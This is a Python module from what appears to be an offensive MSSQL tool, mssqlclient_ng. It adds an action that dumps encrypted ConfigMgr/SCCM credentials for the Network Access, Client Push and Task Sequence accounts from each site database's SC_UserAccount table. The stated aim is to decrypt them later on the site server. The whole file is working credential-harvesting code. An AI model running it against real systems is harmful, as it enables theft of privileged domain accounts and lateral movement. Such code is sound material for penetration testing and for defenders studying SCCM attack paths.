# mssqlclient_ng/core/actions/configmgr/cm_accounts.py

"""Enumerate ConfigMgr user accounts."""

from loguru import logger

from .cm_base import CMBaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...services.configmgr import CMService
from ...utils.formatters import OutputFormatter

@ActionFactory.register(
    "cm-accounts", "Enumerate encrypted credentials (NAA, Client Push, Task Sequence) for decryption on site server."
)
class CMAccounts(CMBaseAction):

    def execute(self, database_context: DatabaseContext) -> list | None:
        logger.info(
            "Enumerating ConfigMgr user accounts (NAA, Client Push, Task Sequence)"
        )

        databases = self._get_databases(database_context)
        if not databases:
            return None

        for db in databases:
            site_code = CMService.get_site_code(db)
            logger.info(f"ConfigMgr database: {db} (Site Code: {site_code})")

            query = f"SELECT * FROM [{db}].dbo.SC_UserAccount ORDER BY UserName;"

            try:
                results = database_context.query_service.execute(query)
                if results:
                    logger.success(
                        f"Found {len(results)} user account(s) with encrypted credentials"
                    )
                    print(OutputFormatter.convert_list_of_dicts(results))
                else:
                    logger.warning("No user accounts found")
            except Exception as ex:
                logger.error(f"Failed to enumerate accounts: {ex}")

        return results
